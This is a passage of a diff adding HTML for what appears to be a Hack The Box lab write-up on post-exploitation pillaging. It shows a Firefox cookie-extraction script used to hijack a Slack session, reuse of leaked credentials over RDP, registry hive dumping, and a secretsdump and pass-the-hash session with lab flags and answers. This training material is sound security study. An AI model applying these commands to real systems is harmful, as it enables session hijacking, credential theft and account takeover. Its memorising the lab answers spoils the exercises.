+<p>Now that we have the file cookies.sqlite, we use the Python script <a href="https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py">cookieextractor.py</a> to extract cookies from the Firefox cookies:</p>
+<p>The script:</p>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-176-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-176-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-176-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-176-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-176-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-176-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-176-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-176-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-176-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-176-10">10</a></span>
+<span class="normal"><a href="#__codelineno-176-11">11</a></span>
+<span class="normal"><a href="#__codelineno-176-12">12</a></span>
+<span class="normal"><a href="#__codelineno-176-13">13</a></span>
+<span class="normal"><a href="#__codelineno-176-14">14</a></span>
+<span class="normal"><a href="#__codelineno-176-15">15</a></span>
+<span class="normal"><a href="#__codelineno-176-16">16</a></span>
+<span class="normal"><a href="#__codelineno-176-17">17</a></span>
+<span class="normal"><a href="#__codelineno-176-18">18</a></span>
+<span class="normal"><a href="#__codelineno-176-19">19</a></span>
+<span class="normal"><a href="#__codelineno-176-20">20</a></span>
+<span class="normal"><a href="#__codelineno-176-21">21</a></span>
+<span class="normal"><a href="#__codelineno-176-22">22</a></span>
+<span class="normal"><a href="#__codelineno-176-23">23</a></span>
+<span class="normal"><a href="#__codelineno-176-24">24</a></span>
+<span class="normal"><a href="#__codelineno-176-25">25</a></span>
+<span class="normal"><a href="#__codelineno-176-26">26</a></span>
+<span class="normal"><a href="#__codelineno-176-27">27</a></span>
+<span class="normal"><a href="#__codelineno-176-28">28</a></span>
+<span class="normal"><a href="#__codelineno-176-29">29</a></span>
+<span class="normal"><a href="#__codelineno-176-30">30</a></span>
+<span class="normal"><a href="#__codelineno-176-31">31</a></span>
+<span class="normal"><a href="#__codelineno-176-32">32</a></span>
+<span class="normal"><a href="#__codelineno-176-33">33</a></span>
+<span class="normal"><a href="#__codelineno-176-34">34</a></span>
+<span class="normal"><a href="#__codelineno-176-35">35</a></span>
+<span class="normal"><a href="#__codelineno-176-36">36</a></span>
+<span class="normal"><a href="#__codelineno-176-37">37</a></span>
+<span class="normal"><a href="#__codelineno-176-38">38</a></span>
+<span class="normal"><a href="#__codelineno-176-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-176-1"><a id="__codelineno-176-1" name="__codelineno-176-1"></a><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="__span-176-2"><a id="__codelineno-176-2" name="__codelineno-176-2"></a><span class="c1"># Sample Script to extract cookies offile from FireFox sqlite database </span>
+</span><span id="__span-176-3"><a id="__codelineno-176-3" name="__codelineno-176-3"></a><span class="c1"># Created by PlainText </span>
+</span><span id="__span-176-4"><a id="__codelineno-176-4" name="__codelineno-176-4"></a>
+</span><span id="__span-176-5"><a id="__codelineno-176-5" name="__codelineno-176-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+</span><span id="__span-176-6"><a id="__codelineno-176-6" name="__codelineno-176-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
+</span><span id="__span-176-7"><a id="__codelineno-176-7" name="__codelineno-176-7"></a>
+</span><span id="__span-176-8"><a id="__codelineno-176-8" name="__codelineno-176-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">dbpath</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
+</span><span id="__span-176-9"><a id="__codelineno-176-9" name="__codelineno-176-9"></a>    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">dbpath</span><span class="p">)</span>
+</span><span id="__span-176-10"><a id="__codelineno-176-10" name="__codelineno-176-10"></a>    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span><span id="__span-176-11"><a id="__codelineno-176-11" name="__codelineno-176-11"></a>
+</span><span id="__span-176-12"><a id="__codelineno-176-12" name="__codelineno-176-12"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">host</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="ow">and</span> <span class="n">cookie</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+</span><span id="__span-176-13"><a id="__codelineno-176-13" name="__codelineno-176-13"></a>        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM moz_cookies&quot;</span>
+</span><span id="__span-176-14"><a id="__codelineno-176-14" name="__codelineno-176-14"></a>    <span class="k">elif</span> <span class="p">(</span><span class="n">host</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span> <span class="ow">and</span> <span class="n">cookie</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+</span><span id="__span-176-15"><a id="__codelineno-176-15" name="__codelineno-176-15"></a>        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM moz_cookies WHERE host LIKE &#39;%</span><span class="si">{}</span><span class="s2">%&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+</span><span id="__span-176-16"><a id="__codelineno-176-16" name="__codelineno-176-16"></a>    <span class="k">elif</span> <span class="p">(</span><span class="n">host</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="ow">and</span> <span class="n">cookie</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+</span><span id="__span-176-17"><a id="__codelineno-176-17" name="__codelineno-176-17"></a>        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM moz_cookies WHERE name LIKE &#39;%</span><span class="si">{}</span><span class="s2">%&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
+</span><span id="__span-176-18"><a id="__codelineno-176-18" name="__codelineno-176-18"></a>    <span class="k">elif</span> <span class="p">(</span><span class="n">host</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span> <span class="ow">and</span> <span class="n">cookie</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">):</span>
+</span><span id="__span-176-19"><a id="__codelineno-176-19" name="__codelineno-176-19"></a>        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM moz_cookies WHERE name LIKE &#39;%</span><span class="si">{}</span><span class="s2">%&#39; AND host LIKE &#39;%</span><span class="si">{}</span><span class="s2">%&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">host</span><span class="p">)</span>
+</span><span id="__span-176-20"><a id="__codelineno-176-20" name="__codelineno-176-20"></a>
+</span><span id="__span-176-21"><a id="__codelineno-176-21" name="__codelineno-176-21"></a>    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+</span><span id="__span-176-22"><a id="__codelineno-176-22" name="__codelineno-176-22"></a>    <span class="n">records</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</span><span id="__span-176-23"><a id="__codelineno-176-23" name="__codelineno-176-23"></a>    <span class="n">rowCount</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">records</span><span class="p">)</span> 
+</span><span id="__span-176-24"><a id="__codelineno-176-24" name="__codelineno-176-24"></a>
+</span><span id="__span-176-25"><a id="__codelineno-176-25" name="__codelineno-176-25"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">rowCount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
+</span><span id="__span-176-26"><a id="__codelineno-176-26" name="__codelineno-176-26"></a>        <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">records</span><span class="p">:</span>
+</span><span id="__span-176-27"><a id="__codelineno-176-27" name="__codelineno-176-27"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+</span><span id="__span-176-28"><a id="__codelineno-176-28" name="__codelineno-176-28"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-176-29"><a id="__codelineno-176-29" name="__codelineno-176-29"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No cookie found with the selected options.&quot;</span><span class="p">)</span>
+</span><span id="__span-176-30"><a id="__codelineno-176-30" name="__codelineno-176-30"></a>
+</span><span id="__span-176-31"><a id="__codelineno-176-31" name="__codelineno-176-31"></a>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-176-32"><a id="__codelineno-176-32" name="__codelineno-176-32"></a>
+</span><span id="__span-176-33"><a id="__codelineno-176-33" name="__codelineno-176-33"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-176-34"><a id="__codelineno-176-34" name="__codelineno-176-34"></a>    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+</span><span id="__span-176-35"><a id="__codelineno-176-35" name="__codelineno-176-35"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--dbpath&quot;</span><span class="p">,</span> <span class="s2">&quot;-d&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The path to the sqlite cookies database&quot;</span><span class="p">)</span>
+</span><span id="__span-176-36"><a id="__codelineno-176-36" name="__codelineno-176-36"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--host&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The host for the cookie&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+</span><span id="__span-176-37"><a id="__codelineno-176-37" name="__codelineno-176-37"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--cookie&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The name of the cookie&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+</span><span id="__span-176-38"><a id="__codelineno-176-38" name="__codelineno-176-38"></a>    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span><span id="__span-176-39"><a id="__codelineno-176-39" name="__codelineno-176-39"></a>    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">dbpath</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">cookie</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Basic usage:</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-177-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-177-1"><a id="__codelineno-177-1" name="__codelineno-177-1"></a><span class="go">python3 cookieextractor.py --dbpath &quot;/home/plaintext/cookies.sqlite&quot; --host slack --cookie d</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-178-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-178-1"><a id="__codelineno-178-1" name="__codelineno-178-1"></a>(10, &#39;&#39;, &#39;d&#39;, &#39;xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==&#39;, &#39;.api.slacktestapp.com&#39;, &#39;/&#39;, 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
+</span></code></pre></div></td></tr></table></div>
+<p>Now that we have the cookie, we can use any browser extension to add the cookie to our browser. </p>
+<p>Go to slacktestapp.com, modify the cookie and you are in.</p>
+<p><strong>Results</strong>: HTB{Stealing_Cookies_To_AccessWebSites}</p>
+<p><strong>Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.</strong></p>
+<p>We know Jeff's credentials from previous exercise. They were exposed in the slack chat conversation.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-179-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-179-1"><a id="__codelineno-179-1" name="__codelineno-179-1"></a>xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>The backup password is in the Desktop, in file backup conf</p>
+<p><strong>Results</strong>: Superbackup!</p>
+<p><strong>Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-180-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-180-1"><a id="__codelineno-180-1" name="__codelineno-180-1"></a>xfreerdp /v:10.129.138.81 /u:jeff /p:Webmaster001! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>We can  check which backups are saved in the repository using the <code>snapshot</code> command.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-181-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-181-1"><a id="__codelineno-181-1" name="__codelineno-181-1"></a>restic.exe -r E:\restic\ snapshots
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-182-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-182-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-182-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-182-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-182-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-182-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-182-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-182-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-182-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-182-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-182-1"><a id="__codelineno-182-1" name="__codelineno-182-1"></a>found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
+</span><span id="__span-182-2"><a id="__codelineno-182-2" name="__codelineno-182-2"></a>ID        Time                 Host             Tags        Paths
+</span><span id="__span-182-3"><a id="__codelineno-182-3" name="__codelineno-182-3"></a>--------------------------------------------------------------------------------------
+</span><span id="__span-182-4"><a id="__codelineno-182-4" name="__codelineno-182-4"></a>02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
+</span><span id="__span-182-5"><a id="__codelineno-182-5" name="__codelineno-182-5"></a>24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
+</span><span id="__span-182-6"><a id="__codelineno-182-6" name="__codelineno-182-6"></a>7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
+</span><span id="__span-182-7"><a id="__codelineno-182-7" name="__codelineno-182-7"></a>4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
+</span><span id="__span-182-8"><a id="__codelineno-182-8" name="__codelineno-182-8"></a>b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
+</span><span id="__span-182-9"><a id="__codelineno-182-9" name="__codelineno-182-9"></a>--------------------------------------------------------------------------------------
+</span><span id="__span-182-10"><a id="__codelineno-182-10" name="__codelineno-182-10"></a>5 snapshots
+</span></code></pre></div></td></tr></table></div>
+<p>We can restore a backup using the ID.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-183-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-183-1"><a id="__codelineno-183-1" name="__codelineno-183-1"></a><span class="n">restic</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">E</span><span class="p">:\</span><span class="n">restic</span><span class="p">\</span> <span class="n">restore</span> <span class="n">11dcaee2</span> <span class="p">-</span><span class="n">-target</span> <span class="n">C</span><span class="p">:\</span><span class="n">Restore</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Also we could launch  CMD as an admin will allow us to run reg.exe to save copies of the registry hives.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-184-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-184-1"><a id="__codelineno-184-1" name="__codelineno-184-1"></a>reg.exe save hklm\sam c:\Users\jeff\Desktop\sam.save reg.exe save hklm\system c:\Users\jeff\Desktop\system.save 
+</span></code></pre></div></td></tr></table></div>
+<p>And copy it by using PSUpload.ps1 to our local machine. Once there:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-185-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-185-1"><a id="__codelineno-185-1" name="__codelineno-185-1"></a>python3<span class="w"> </span>~/tools/impacket/examples/secretsdump.py<span class="w"> </span>-sam<span class="w"> </span>sam.save<span class="w">  </span>-system<span class="w"> </span>system.save<span class="w"> </span>LOCAL<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Results</strong>: bac9dc5b7b4bec1d83e0e9c04b477f26</p>
+<p>Optional Exercises. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-186-1">1</a></span>
+<span class="normal"><a href="#__codelineno-186-2">2</a></span>
+<span class="normal"><a href="#__codelineno-186-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-186-1"><a id="__codelineno-186-1" name="__codelineno-186-1"></a>xfreerdp /v:10.129.138.81 /u:Administrator /pth:bac9dc5b7b4bec1d83e0e9c04b477f26 /cert:ignore
+</span><span id="__span-186-2"><a id="__codelineno-186-2" name="__codelineno-186-2"></a>
+</span><span id="__span-186-3"><a id="__codelineno-186-3" name="__codelineno-186-3"></a>crackmapexec smb 10.129.138.81 -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26 --exec &quot;cmd.exe&quot;
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 14, 2025 19:20:13"><span class="timeago" datetime="2025-04-14T19:20:13+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 14, 2025 19:20:13">2025-04-14</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 24, 2025 18:41:39"><span class="timeago" datetime="2025-04-24T18:41:39+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 24, 2025 18:41:39">2025-04-24</span></small></br>
 
 
     <small>Created: February 23, 2025 21:12:05</small>
